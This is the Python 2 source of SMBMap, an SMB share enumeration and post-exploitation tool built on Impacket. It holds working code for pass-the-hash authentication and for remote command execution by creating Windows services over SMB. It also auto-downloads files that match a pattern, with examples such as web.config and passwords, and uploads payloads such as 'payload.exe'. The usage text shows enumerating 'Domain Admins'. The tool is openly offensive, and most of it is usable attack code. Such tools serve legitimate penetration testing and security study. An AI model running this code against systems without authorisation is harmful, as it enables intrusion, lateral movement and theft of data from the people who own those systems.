import sys
import signal
import string
import time
import random
import string
import logging
import ConfigParser
from threading import Thread
from impacket import smb, version, smb3, nt_errors, smbserver
from impacket.dcerpc.v5 import samr, transport, srvs
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import *
from impacket.dcerpc import transport, svcctl, srvsvc
import ntpath
import cmd
import os
import re

# A lot of this code was taken from Impacket's own examples
# https://impacket.googlecode.com
# Seriously, the most amazing Python library ever!!
# Many thanks to that dev team

OUTPUT_FILENAME = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 10))
BATCH_FILENAME  = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 10)) + '.bat'
SMBSERVER_DIR   = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 10))
DUMMY_SHARE     = 'TMP'
PERM_DIR = ''.join(random.sample('ABCDEFGHIGJLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 10))

class SMBServer(Thread):
    def __init__(self):
        if os.geteuid() != 0:
            exit('[!] Error: ** SMB Server must be run as root **')
        Thread.__init__(self)

    def cleanup_server(self):
        print '[*] Cleaning up..'
        try:
            os.unlink(SMBSERVER_DIR + '/smb.log')
        except:
            pass
        os.rmdir(SMBSERVER_DIR)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(DUMMY_SHARE)
        smbConfig.set(DUMMY_SHARE,'comment','')
        smbConfig.set(DUMMY_SHARE,'read only','no')
        smbConfig.set(DUMMY_SHARE,'share type','0')
        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        print '[*] Creating tmp directory'
        try:
            os.mkdir(SMBSERVER_DIR)
        except Exception, e:
            print '[!]', e
            pass
        print '[*] Setting up SMB Server'
        self.smb.processConfigFile()
        print '[*] Ready to listen...'
        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

class RemoteShell():
    def __init__(self, share, rpc, mode, serviceName, command):
        self.__share = share
        self.__mode = mode
        self.__output = '\\' + OUTPUT_FILENAME
        self.__batchFile = '\\' + BATCH_FILENAME
        self.__outputBuffer = ''
        self.__command = command
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc

        dce = rpc.get_dce_rpc()
        try:
            dce.connect()
        except Exception, e:
            print '[!]', e
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            print(exc_type, fname, exc_tb.tb_lineno)
            sys.exit(1)

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        
        dce.bind(svcctl.MSRPC_UUID_SVCCTL)
        self.rpcsvc = svcctl.DCERPCSvcCtl(dce)
        resp = self.rpcsvc.OpenSCManagerW()
        self.__scHandle = resp['ContextHandle']
        self.transferClient = rpc.get_smb_connection()

    def set_copyback(self):
        s = self.__rpc.get_smb_connection()
        s.setTimeout(100000)
        myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
        self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

    def finish(self):
        # Just in case the service is still created
        try:
           dce = self.__rpc.get_dce_rpc()
           dce.connect()
           dce.bind(svcctl.MSRPC_UUID_SVCCTL)
           self.rpcsvc = svcctl.DCERPCSvcCtl(dce)
           resp = self.rpcsvc.OpenSCManagerW()
           self.__scHandle = resp['ContextHandle']
           resp = self.rpcsvc.OpenServiceW(self.__scHandle, self.__serviceName)
           service = resp['ContextHandle']
           self.rpcsvc.DeleteService(service)
           self.rpcsvc.StopService(service)
           self.rpcsvc.CloseServiceHandle(service)
        except Exception, e:
            print '[!]', e
            pass

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data
        
        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, self.__output, output_callback)
            self.transferClient.deleteFile(self.__share, self.__output)
        else:
            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile
        if self.__mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile

        resp = self.rpcsvc.CreateServiceW(self.__scHandle, self.__serviceName, self.__serviceName, command.encode('utf-16le'))
        service = resp['ContextHandle']
        try:
           self.rpcsvc.StartServiceW(service)
        except:
           pass
        self.rpcsvc.DeleteService(service)
        self.rpcsvc.CloseServiceHandle(service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print self.__outputBuffer
        self.__outputBuffer = ''

class CMDEXEC:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
        }


    def __init__(self, protocols = None,
                 username = '', password = '', domain = '', hashes = None, share = None, command = None):
        if not protocols:
            protocols = PSEXEC.KNOWN_PROTOCOLS.keys()

        self.__username = username
        self.__password = password
        self.__protocols = [protocols]
        self.__serviceName = self.service_generator().encode('utf-16le')
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__share = share
        self.__mode  = 'SHARE'
        self.__command = command
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def service_generator(self, size=6, chars=string.ascii_uppercase):
        return ''.join(random.choice(chars) for _ in range(size))

    def run(self, addr):
        for protocol in self.__protocols:
            protodef = CMDEXEC.KNOWN_PROTOCOLS[protocol]
            port = protodef[1]

            stringbinding = protodef[0] % addr

            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(port)

            if hasattr(rpctransport,'preferred_dialect'):
               rpctransport.preferred_dialect(SMB_DIALECT)
            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            try:
                self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command)
                self.shell.send_data(self.__command)
            except SessionError as e:
                if 'STATUS_SHARING_VIOLATION' in str(e):
                    print '[!] Error encountered, sharing violation, unable to retrieve output'
                    sys.exit(1)
                print '[!] Error accessing C$, attempting to start SMB server to store output'
                smb_server = SMBServer()
                smb_server.daemon = True
                smb_server.start()
                self.__mode = 'SERVER'
                self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command)
                self.shell.set_copyback()
                self.shell.send_data(self.__command)
                smb_server.stop() 
            except (Exception, KeyboardInterrupt), e:
                print '[!] Insufficient privileges, unable to execute code' 
                print '[!]', e
                exc_type, exc_obj, exc_tb = sys.exc_info()
                fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                #print(exc_type, fname, exc_tb.tb_lineno)
                sys.stdout.flush()
           
            
class SMBMap():
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
        }

    def __init__(self):
        self.username = None
        self.password = None
        self.domain = None
        self.smbconn = None 
        self.port = 445
        self.isLoggedIn = False
     
    def login(self, username, password, domain, host):
        self.username = username
        self.password = password
        self.domain = domain
        self.host = host
        
        try:
            self.smbconn = SMBConnection(host, host, sess_port=self.port)
            self.smbconn.login(username, password, domain=self.domain)
             
            if self.smbconn.isGuestSession() > 0:
                print '[+] Guest SMB session established...'
            else:
                print '[+] User SMB session establishd...'
            return True

        except Exception as e:
            print '[!] Authentication error occured'
            print '[!]', e
            return False
 
    def logout(self):
        self.smbconn.logoff()

    def logout_rpc(self):
        self.smbconn.logoff() 
                   
    def login_rpc_hash(self, username, ntlmhash, domain, host):
        self.username = username
        self.password = ntlmhash
        self.domain = domain
        self.host = host
        
        lmhash, nthash = ntlmhash.split(':')    
    
        try:
            self.smbconn = SMBConnection('*SMBSERVER', host, sess_port=139)
            self.smbconn.login(username, '', domain, lmhash=lmhash, nthash=nthash)
            
            if self.smbconn.isGuestSession() > 0:
                print '[+] Guest RCP session established...'
            else:
                print '[+] User RCP session establishd...'
            return True

        except Exception as e:
            print '[!] RPC Authentication error occured'
            sys.exit()
     
    def login_rpc(self, username, password, domain, host):
        self.username = username
        self.password = password
        self.domain = domain
        self.host = host
        try:
            self.smbconn = SMBConnection('*SMBSERVER', host, sess_port=139)
            self.smbconn.login(username, password, domain)
            
            if self.smbconn.isGuestSession() > 0:
                print '[+] Guest RCP session established...'
            else:
                print '[+] User RCP session establishd...'
            return True
        
        except Exception as e:
            print '[!] RPC Authentication error occured'
            return False
            sys.exit()
 
    def login_hash(self, username, ntlmhash, domain, host):
        self.username = username
        self.password = ntlmhash
        self.domain = domain
        self.host = host
        lmhash, nthash = ntlmhash.split(':')    
        try:
            self.smbconn = SMBConnection(host, host, sess_port=self.port)
            self.smbconn.login(username, '', domain, lmhash=lmhash, nthash=nthash)
            
            if self.smbconn.isGuestSession() > 0:
                print '[+] Guest session established...'
            else:
                print '[+] User session establishd...'
            return True

        except Exception as e:
            print '[!] Authentication error occured'
            print '[!]', e
            return False
            sys.exit()   
 
    def find_open_ports(self, address, port):    
        result = 1
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((address,port))
            if result == 0:
                sock.close()
                return True
        except:
            return False

    def get_shares(self):
        return self.smbconn.listShares()

    def list_shares(self, display=False):
        shareList = self.smbconn.listShares()
        shares = []
        for item in range(len(shareList)):
            if display:
                print shareList[item]['shi1_netname'][:-1]
            shares.append(shareList[item]['shi1_netname'][:-1])
        return shares 

    def list_path_recursive(self, share, pwd, wildcard, pathList, pattern):
        root = self.pathify(pwd)
        width = 16
        try:
            pathList[root] = self.smbconn.listPath(share, root)
            if '-A' not in sys.argv:
                print '\t.%s' % (pwd.replace('//','/'))
            if len(pathList[root]) > 2:
                    for smbItem in pathList[root]:
                        try:
                            filename = smbItem.get_longname()
                            isDir = 'd' if smbItem.is_directory() > 0 else '-' 
                            filesize = smbItem.get_filesize() 
                            readonly = 'w' if smbItem.is_readonly() > 0 else 'r'
                            date = time.ctime(float(smbItem.get_mtime_epoch()))
                            if smbItem.is_directory() <= 0:
                                if '-A' in sys.argv:
                                    fileMatch = re.search(pattern.lower(), filename.lower())
                                    if fileMatch:
                                        dlThis = '%s%s/%s' % (share, pwd, filename) 
                                        print '\t[+] Match found! Downloading: %s' % (dlThis.replace('//','/'))
                                        self.download_file( dlThis ) 
                            #if '-A' not in sys.argv:
                            print '\t%s%s--%s--%s-- %s %s\t%s' % (isDir, readonly, readonly, readonly, str(filesize).rjust(width), date, filename)
                        except SessionError as e:
                            print '[!]', e
                            continue
                        except Exception as e:
                            print '[!]', e
                            exc_type, exc_obj, exc_tb = sys.exc_info()
                            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                            print(exc_type, fname, exc_tb.tb_lineno)
                            sys.stdout.flush()

                    for smbItem in pathList[root]:
                        try:
                            filename = smbItem.get_longname()
                            if smbItem.is_directory() > 0 and filename != '.' and filename != '..':
                                subPath = '%s/%s' % (pwd, filename)
                                subPath = self.pathify(subPath)
                                pathList[subPath] = self.smbconn.listPath(share, subPath)
                                if len(pathList[subPath]) > 2:
                                    self.list_path_recursive(share, '%s/%s' % (pwd, filename), wildcard, pathList, pattern)

                        except SessionError as e:
                            continue
        except:
            pass

    def pathify(self, path):
        root = ntpath.join(path,'*')
        root = root.replace('/','\\')
        root = ntpath.normpath(root)
        return root

    def list_path(self, share, path, pattern, display=False):
        pwd = self.pathify(path)
        width = 16
        try: 
            pathList = self.smbconn.listPath(share, pwd)
            if display:
                print '\t.%s' % (path.ljust(50))
                for item in pathList:
                    filesize = item.get_filesize() 
                    readonly = 'w' if item.is_readonly() > 0 else 'r'
                    date = time.ctime(float(item.get_mtime_epoch()))
                    isDir = 'd' if item.is_directory() > 0 else 'f'
                    filename = item.get_longname()
                    if item.is_directory() <= 0:
                        if '-A' in sys.argv:
                            fileMatch = re.search(pattern.lower(), filename.lower())
                            if fileMatch:
                                dlThis = '%s%s/%s' % (share, pwd.strip('*'), filename) 
                                print '\t[+] Match found! Downloading: %s' % (dlThis.replace('//','/'))
                                self.download_file( dlThis ) 
                    if display:
                        print '\t%s%s--%s--%s-- %s %s\t%s' % (isDir, readonly, readonly, readonly, str(filesize).rjust(width), date, filename)
            return True
        except Exception as e:
            return False     
 
    def create_dir(self, share, path):
        #path = self.pathify(path)
        self.smbconn.createDirectory(share, path)

    def remove_dir(self, share, path):
        #path = self.pathify(path)
        self.smbconn.deleteDirectory(share, path)
    
    def valid_ip(self, address):
        try:
            socket.inet_aton(address)
            return True
        except:
            return False

    def filter_results(self, pattern):
        pass
    
    def download_file(self, path):
        path = path.replace('/','\\')
        path = ntpath.normpath(path)
        filename = path.split('\\')[-1]   
        share = path.split('\\')[0]
        path = path.replace(share, '')
        try:
            out = open(ntpath.basename('%s/%s' % (os.getcwd(), '%s-%s%s' % (self.host, share, path.replace('\\','_')))),'wb')
            dlFile = self.smbconn.listPath(share, path)
            print '\t[+] Starting download: %s (%s bytes)' % ('%s%s' % (share, path), dlFile[0].get_filesize())
            self.smbconn.getFile(share, path, out.write)
            print '\t[+] File output to: %s/%s' % (os.getcwd(), ntpath.basename('%s/%s' % (os.getcwd(), '%s-%s%s' % (self.host, share, path.replace('\\','_')))))
        except SessionError as e:
            if 'STATUS_ACCESS_DENIED' in str(e):
                print '[!] Error retrieving file, access denied'
            elif 'STATUS_INVALID_PARAMETER' in str(e):
                print '[!] Error retrieving file, invalid path'
            elif 'STATUS_SHARING_VIOLATION' in str(e):
                print '[!] Error retrieving file, sharing violation'
        except Exception as e:
            print '[!] Error retrieving file, unkown error'
            os.remove(filename)
        out.close()
    
    def exec_command(self, share, command):
        if self.is_ntlm(self.password):
            hashes = self.password
        else:
            hashes = None 
        executer = CMDEXEC('445/SMB', self.username, self.password, self.domain, hashes, share, command)
        executer.run(self.host)   
 
    def delete_file(self, path):
        path = path.replace('/','\\')
        path = ntpath.normpath(path)
        filename = path.split('\\')[-1]   
        share = path.split('\\')[0]
        path = path.replace(share, '')
        path = path.replace(filename, '')
        try:
            self.smbconn.deleteFile(share, path + filename)
            print '[+] File successfully deleted: %s%s%s' % (share, path, filename)
        except SessionError as e:
            if 'STATUS_ACCESS_DENIED' in str(e):
                print '[!] Error deleting file, access denied'
            elif 'STATUS_INVALID_PARAMETER' in str(e):
                print '[!] Error deleting file, invalid path'
            elif 'STATUS_SHARING_VIOLATION' in str(e):
                print '[!] Error retrieving file, sharing violation'
            else:
                print '[!] Error deleting file, unkown error'
                print '[!]', e
        except Exception as e:
            print '[!] Error deleting file, unkown error'
            print '[!]', e
         
    def upload_file(self, src, dst): 
        dst = string.replace(dst,'/','\\')
        dst = ntpath.normpath(dst)
        dst = dst.split('\\')
        share = dst[0]
        dst = '\\'.join(dst[1:])
        if os.path.exists(src):
            print '[+] Starting upload: %s (%s bytes)' % (src, os.path.getsize(src))
            upFile = open(src, 'rb')
            try:
                self.smbconn.putFile(share, dst, upFile.read)
                print '[+] Upload complete' 
            except:
                print '[!] Error uploading file, you need to include destination file name in the path'
            upFile.close() 
        else:
            print '[!] Invalid source. File does not exist'
            sys.exit()

    def is_ntlm(self, password):
        try:
            if len(password.split(':')) == 2:
                lm, ntlm = password.split(':')
                if len(lm) == 32 and len(ntlm) == 32:
                    return True
                else: 
                    return False
        except Exception as e:
            return False

    def get_version(self):
        try:
            rpctransport = transport.SMBTransport(self.smbconn.getServerName(), self.smbconn.getRemoteHost(), filename = r'\srvsvc', smb_connection = self.smbconn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(srvs.MSRPC_UUID_SRVS)
            resp = srvs.hNetrServerGetInfo(dce, 102)
            
            print "Version Major: %d" % resp['InfoStruct']['ServerInfo102']['sv102_version_major']
            print "Version Minor: %d" % resp['InfoStruct']['ServerInfo102']['sv102_version_minor']
            print "Server Name: %s" % resp['InfoStruct']['ServerInfo102']['sv102_name']
            print "Server Comment: %s" % resp['InfoStruct']['ServerInfo102']['sv102_comment']
            print "Server UserPath: %s" % resp['InfoStruct']['ServerInfo102']['sv102_userpath']
            print "Simultaneous Users: %d" % resp['InfoStruct']['ServerInfo102']['sv102_users']
        except Exception as e:
            print '[!] RPC Access denied...oh well'
            print '[!]', e
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            print(exc_type, fname, exc_tb.tb_lineno)
            sys.exit()

def signal_handler(signal, frame):
    print 'You pressed Ctrl+C!'
    sys.exit(1)

def usage():
    print 'SMBMap - Samba Share Enumerator'
    print 'Shawn Evans - Shawn.Evans@gmail.com'
    print ''
    print '$ python %s -u jsmith -p password1 -d workgroup -h 192.168.0.1' % (sys.argv[0])
    print '$ python %s -u jsmith -p \'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d\' -h 172.16.0.20' % (sys.argv[0]) 
    print '$ cat smb_ip_list.txt | python %s -u jsmith -p password1 -d workgroup' % (sys.argv[0])
    print '$ python smbmap.py -u \'apadmin\' -p \'asdf1234!\' -d ACME -h 10.1.3.30 -x \'net group "Domain Admins" /domain\''
    print ''
    print '-P\t\tport (default 445), ex 139'
    print '-h\t\tHostname or IP'
    print '-u\t\tUsername, if omitted null session assumed'
    print '-p\t\tPassword or NTLM hash' 
    print '-s\t\tShare to use for smbexec command output (default C$), ex \'C$\''
    print '-x\t\tExecute a command, ex. \'ipconfig /r\''
    print '-d\t\tDomain name (default WORKGROUP)'
    print '-R\t\tRecursively list dirs, and files (no share\path lists ALL shares), ex. \'C$\\Finance\''
    print '-A\t\tDefine a file name pattern (regex) that auto downloads a file on a match (requires -R or -r), not case sensitive, ex "(web|global).(asax|config)"'
    print '-r\t\tList contents of directory, default is to list root of all shares, ex. -r \'c$\Documents and Settings\Administrator\Documents\''
    print '-F\t\tFile content filter, -f "password" (feature pending)'
    print '-D\t\tDownload path, ex. \'C$\\temp\\passwords.txt\''
    print '--upload-src\tFile upload source, ex \'/temp/payload.exe\'  (note that this requires --upload-dst for a destiation share)'
    print '--upload-dst\tUpload destination on remote host, ex \'C$\\temp\\payload.exe\''
    print '--del\t\tDelete a remote file, ex. \'C$\\temp\\msf.exe\''
    print '--skip\t\tSkip delete file confirmation prompt'
    print ''
    sys.exit()
     
if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    if len(sys.argv) < 3:
        usage()
    mysmb = SMBMap()
    validArgs = ('-d', '-P', '-h', '-u', '-p', '-s', '-x', '-A', '-R', '-F', '-D', '-r', '--upload-src', '--upload-dst', '--del', '--skip')
    ipArg = False 
    ip = ''
    counter = 0
    isFile = False
    host = {}
    canWrite = 0
    dlPath = False
    src = False
    dst = False
    delFile = False
    lsshare = False 
    lspath = False
    command= False
    port = False
    share = False
    skip = None
    user = ''
    passwd = ''
    pattern = ''
     
    for val in sys.argv:
        try:
            if val == '-?' or val == '--help':
                usage()
            if val == '-R' or val == '-r':
                try:
                    if sys.argv[counter+1] not in validArgs:
                        lspath = sys.argv[counter+1].replace('/','\\').split('\\')
                        lsshare = lspath[0]
                        lspath = '\\'.join(lspath[1:])
                except:
                    continue
            if val == '-u':
                if sys.argv[counter+1] not in validArgs:
                    user = sys.argv[counter+1]
                else:
                   raise Exception('Invalid Username')
            if val == '-x':
                if sys.argv[counter+1] not in validArgs:
                    command = sys.argv[counter+1]
                else:
                    raise Exception('Invalid smbexec command')
            if val == '-p':
                if sys.argv[counter+1] not in validArgs:
                    passwd = sys.argv[counter+1]
                else:
                    raise Exception('Invalid password')
            if val == '-d':
                if sys.argv[counter+1] not in validArgs:
                    domain = sys.argv[counter+1]
                else:
                    raise Exception('Invalid domain name')
            if val == '-h':
                if sys.argv[counter+1] not in validArgs:
                    ipArg = sys.argv[counter+1]
                else:
                    raise Exception('Host missing')
            if val == '-s':
                if sys.argv[counter+1] not in validArgs:
                    share = sys.argv[counter+1]
                else:
                    raise Exception('Invalid share')
            if val == '-A':
                try:
                    if sys.argv[counter+1] not in validArgs:
                        pattern = sys.argv[counter+1]
                        print '[+] Auto download pattern defined: %s' % (pattern)
                except Exception as e:
                    print '[!]', e
                    continue
            if val == '-P':
                if sys.argv[counter+1] not in validArgs:
                    port = sys.argv[counter+1]
                else:
                    raise Exception('Invalid port')
            if val == '-D':
                try:
                    if sys.argv[counter+1] not in validArgs:
                        dlPath = sys.argv[counter+1]
                except:
                    print '[!] Missing download source'
                    sys.exit()
            if val == '--upload-dst':
                try:
                    if sys.argv[counter+1] not in validArgs:
                        dst = sys.argv[counter+1]
                    else:
                        raise Exception('Missing destination upload path')
                except:
                    print '[!] Missing destination upload path (--upload-dst)'
                    sys.exit()
            if val == '--upload-src':
                try:
                    if sys.argv[counter+1] not in validArgs:
                        src = sys.argv[counter+1]
                    else:
                        raise Exception('Invalid upload source')
                except:
                    print '[!] Missing upload source'
                    sys.exit()
            if val == '--del':
                if sys.argv[counter+1] not in validArgs:
                    delFile = sys.argv[counter+1]
                else:
                    raise Exception('Invalid delete path')
            if val == '--skip':
               skip = True 
            counter+=1
        except Exception as e:
            print '[!]', e 
            sys.exit()

    choice = ''  

    if command and not share:
        share = 'C$'
    if delFile and skip == None: 
        valid = ['Y','y','N','n'] 
        while choice not in valid:
            sys.stdout.write('[?] Confirm deletetion of file: %s [Y/n]? ' % (delFile))
            choice = raw_input()
            if choice == 'n' or choice == 'N':
                print '[!] File deletion aborted...'
                sys.exit()
            elif choice == 'Y' or choice == 'y' or choice == '':
                break
            else:
                print '[!] Invalid input'

    if (not src and dst): 
        print '[!] Upload destination defined, but missing source (--upload-src)'
        sys.exit()
    elif (not dst and src):
        print '[!] Upload source defined, but missing destination (--upload-dst)'
        sys.exit()

    if '-A' in sys.argv and ('-R' not in sys.argv and  '-r' not in sys.argv):
        print '[!] Auto download requires file listing (-r or -R)...aborting'
        sys.exit()
     
    if '-p' not in sys.argv:
        passwd = raw_input('%s\'s Password: ' % (user))    
 
    if len(set(sys.argv).intersection(['-d'])) == 0: 
        print '[!] Missing domain...defaulting to WORKGROUP'
        domain = 'WORKGROUP'
    
    if mysmb.valid_ip(ipArg):
        ip = ipArg
    elif not sys.stdin.isatty():
        isFile = True
        print '[+] Reading from stdin'
        ip = sys.stdin.readlines()
    else:
        print '[!] Host not defined'
        sys.exit()
   
    if not port:
        port = 445
    if '-v' in sys.argv:
        port = 139

    print '[+] Finding open SMB ports....'
    socket.setdefaulttimeout(2)
    if isFile:
        for i in ip:
            try:
                if mysmb.find_open_ports(i.strip(), int(port)):
                    try:
                        host[i.strip()] = { 'name': socket.getnameinfo(i.strip(), port) , 'port' : port }
                    except:
                        host[i.strip()] = { 'name': 'unkown' , 'port' : port }
            except Exception as e:
                print '[!]', e
                continue
    else:
        if mysmb.find_open_ports(ip, int(port)):
            if port:
                try:
                    #host[ip.strip()] = { 'name' : socket.gethostbyaddr(ip)[0], 'port' : port }
                    host[ip.strip()] = { 'name' : socket.getnameinfo(i.strip(), port), 'port' : port }
                except:
                    host[ip.strip()] = { 'name' : 'unkown' , 'port' : port }

    for key in host.keys():
        if mysmb.is_ntlm(passwd):
            print '[+] Hash detected, using pass-the-hash to authentiate'
            if host[key]['port'] == 445: 
                success = mysmb.login_hash(user, passwd, domain, key)
            else:
                success = mysbm.login_rpc_hash(user, passwd, domain, key)
        else:
            if host[key]['port'] == 445:
                success = mysmb.login(user, passwd, domain, key)
            else:
                success = mysmb.login_rpc(user, passwd, domain, key)
        if not success:
            print '[!] Authentication error on %s' % (key)
            continue
 
 
        print '[+] IP: %s:%s\tName: %s' % (key, host[key]['port'], host[key]['name'].ljust(50))
        
        if '-v' in sys.argv:
            mysmb.get_version()
        
        if not dlPath and not src and not delFile and not command:        
            print '\tDisk%s\tPermissions' % (' '.ljust(50))
            print '\t----%s\t-----------' % (' '.ljust(50))

        try:
            error = 0
            if dlPath:
                mysmb.download_file(dlPath)
                sys.exit()

            if src and dst:
                mysmb.upload_file(src, dst)
                sys.exit()

            if delFile:
                mysmb.delete_file(delFile)
                sys.exit()
            
            if command:
                mysmb.exec_command(share, command)
                sys.exit()

            shareList = [lsshare] if lsshare else mysmb.list_shares(False)
            for share in shareList:
                pathList = {}
                canWrite = False
                try:
                    root = string.replace('/%s' % (PERM_DIR),'/','\\')
                    root = ntpath.normpath(root)
                    mysmb.create_dir(share, root)
                    print '\t%s\tREAD, WRITE' % (share.ljust(50))
                    canWrite = True
                    try:
                        mysmb.remove_dir(share, root)
                    except:
                        print '\t[!] Unable to remove test directory at \\\\%s\\%s%s, plreae remove manually' % (key, share, root)
                except Exception as e:
                    #print e
                    exc_type, exc_obj, exc_tb = sys.exc_info()
                    fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    #print(exc_type, fname, exc_tb.tb_lineno)
                    sys.stdout.flush()
                    canWrite = False

                if canWrite == False:
                    readable = mysmb.list_path(share, '', pattern, False)
                    if readable:
                        print '\t%s\tREAD ONLY' % (share.ljust(50))
                    else:
                        error += 1

                if error == 0 and (len(set(sys.argv).intersection(['-r','-R'])) == 1):
                    path = '/'
                    if '-f' in sys.argv:
                        resultFilter = sys.argv[sys.argv.index('-f') + 1]
                    elif '-F' in sys.argv:
                        resultFilter = sys.argv[sys.argv.index('-F') + 1]
                    else:
                        resultFilter = ''

                    if '-r' in sys.argv:
                        if lsshare and lspath:
                            if '-A' in sys.argv:
                                print '\t[+] Starting search for files matching \'%s\' on share %s.' % (pattern, lsshare)
                            dirList = mysmb.list_path(lsshare, lspath, pattern, True)
                            sys.exit()
                        else:
                            if '-A' in sys.argv:
                                print '\t[+] Starting search for files matching \'%s\' on share %s.' % (pattern, share)
                            dirList = mysmb.list_path(share, path, pattern, True)

                    elif '-R' in sys.argv:
                        if lsshare and lspath:
                            if '-A' in sys.argv:
                                print '\t[+] Starting search for files matching \'%s\' on share %s.' % (pattern, lsshare)
                            dirList = mysmb.list_path_recursive(lsshare, lspath, '*', pathList, pattern)
                            sys.exit()
                        else:
                            if '-A' in sys.argv:
                                print '\t[+] Starting search for files matching \'%s\' on share %s.' % (pattern, share)
                            dirList = mysmb.list_path_recursive(share, path, '*', pathList, pattern)

                if error > 0:
                    print '\t%s\tNO ACCESS' % (share.ljust(50))
                    error = 0
            mysmb.logout() 

        except SessionError as e:
            print '[!] Access Denied'
        except Exception as e:
            print '[!]', e
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            print(exc_type, fname, exc_tb.tb_lineno)
            sys.stdout.flush()
